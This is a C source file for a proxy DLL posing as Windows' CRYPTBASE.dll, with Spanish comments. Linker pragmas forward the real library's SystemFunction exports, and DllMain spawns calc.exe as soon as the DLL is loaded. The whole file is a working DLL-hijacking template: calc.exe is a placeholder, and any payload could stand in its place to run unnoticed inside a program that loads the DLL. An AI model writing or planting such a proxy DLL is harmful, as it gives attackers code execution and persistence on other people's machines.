#include <Windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>

#pragma comment(linker, "/export:\"SystemFunction001=C:/Windows/System32/CRYPTBASE.SystemFunction001\"")
#pragma comment(linker, "/export:\"SystemFunction002=C:/Windows/System32/CRYPTBASE.SystemFunction002\"")
#pragma comment(linker, "/export:\"SystemFunction003=C:/Windows/System32/CRYPTBASE.SystemFunction003\"")
#pragma comment(linker, "/export:\"SystemFunction004=C:/Windows/System32/CRYPTBASE.SystemFunction004\"")
#pragma comment(linker, "/export:\"SystemFunction005=C:/Windows/System32/CRYPTBASE.SystemFunction005\"")
#pragma comment(linker, "/export:\"SystemFunction028=C:/Windows/System32/CRYPTBASE.SystemFunction028\"")
#pragma comment(linker, "/export:\"SystemFunction029=C:/Windows/System32/CRYPTBASE.SystemFunction029\"")
#pragma comment(linker, "/export:\"SystemFunction034=C:/Windows/System32/CRYPTBASE.SystemFunction034\"")
#pragma comment(linker, "/export:\"SystemFunction036=C:/Windows/System32/CRYPTBASE.SystemFunction036\"")
#pragma comment(linker, "/export:\"SystemFunction040=C:/Windows/System32/CRYPTBASE.SystemFunction040\"")
#pragma comment(linker, "/export:\"SystemFunction041=C:/Windows/System32/CRYPTBASE.SystemFunction041\"")

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Path completo a calc.exe
        LPCSTR lpApplicationName = "C:\\Windows\\System32\\calc.exe";

        // No necesitamos la ruta en lpCommandLine
        LPCSTR lpCommandLine = NULL;

        // Se pueden agregar opciones adicionales al proceso aqu√≠
        LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
        LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
        BOOL bInheritHandles = FALSE;
        DWORD dwCreationFlags = 0;
        LPVOID lpEnvironment = NULL;
        LPCSTR lpCurrentDirectory = NULL;
        STARTUPINFOA StartupInfo;
        PROCESS_INFORMATION ProcessInfo;

        ZeroMemory(&StartupInfo, sizeof(StartupInfo));
        ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
        StartupInfo.cb = sizeof(StartupInfo);

        // Crea el proceso
        if (CreateProcessA(lpApplicationName, (LPSTR)lpCommandLine, lpProcessAttributes, lpThreadAttributes,
            bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &StartupInfo, &ProcessInfo))
        {
            // Cierra los handles de proceso y hilo una vez que el proceso termina
            CloseHandle(ProcessInfo.hProcess);
            CloseHandle(ProcessInfo.hThread);
        }

        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}